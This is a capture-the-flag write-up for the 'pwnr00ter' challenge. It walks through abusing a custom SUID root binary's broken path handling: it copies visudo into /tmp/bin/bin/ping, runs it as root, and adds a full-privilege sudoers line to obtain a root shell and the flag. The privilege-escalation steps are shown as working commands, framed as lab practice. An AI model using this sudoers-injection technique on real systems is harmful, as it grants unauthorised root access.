# pwnr00ter

## Information:

- Compte
- ssh://$USER@REDACTED:REDACTED

The description tell us that this binary is what we need to interact with `pwnr00ter`
Lets chek it out
```bash
device@pwnr00ter-7eddae50:/tmp$ ls -lah /usr/bin/pwnr00ter 
-rwsr-sr-x 1 root root 16K Oct 23 16:36 /usr/bin/pwnr00ter
#  ^------------- Oh! SUID bit!
```

Lets run strings as usual
```bash
strings /usr/bin/pwnr00ter 
bash: strings: command not found
```
Humm.. cat?
```
[READCTED garbage]
One must specify one permitted binary, no arguments allowed![+] Checking if [%s] is allowed to run with privileges
/usr/bin/whoami/usr/bin/date/usr/bin/uname/bin/bin/ping/usr/bin/hostname[-] [%s] not in allowed list, access denied!
[+] Access granted! Running [%s] as root
[REDACTED garbage]
```

Ok so the SUID bit was intentional and i may run those binary without argument
- /usr/bin/whoami
- /usr/bin/date
- /usr/bin/uname
- /bin/bin/ping
- /usr/bin/hostname

Lets try them all
``` bash
pwnr00ter ping
[+] pwnr00ter application starting ...

[+] Checking if [ping] is allowed to run with privileges
[+] Access granted! Running [ping] as root
: usage error: Destination address required
```
I did many try, to finally realize wait... `/bin/bin/ping` ? 
What the `REDACTED` is this path?! 
```bash
/bin$ mkdir bin
mkdir: cannot create directory ‘bin’: Permission denied
```
That would have been too easy if I could write in `/bin`
But how did it found `ping` if the path is wrong? This tell me that there might be a problem with the path of the binaries it launch

```bash
cp /usr/sbin/visudo /tmp/bin/bin/ping
pwnr00ter ping
```
A lots of error but it finally open the vi editor
Lets grant ourselve a bit more privileges
```
device  ALL=(ALL:ALL) ALL
```
Suivis de 
```bash
sudo -i
```

```bash
root@pwnr00ter-7eddae50:~# ls
flag.txt
root@pwnr00ter-7eddae50:~# cat flag.txt 
FINCTF{Thou shall not roll you own sudo}
```

Thank to @`r3my` that made me realise I did a rookie mistake by forgetting to add `!` a `:wq` while saving the sudo role.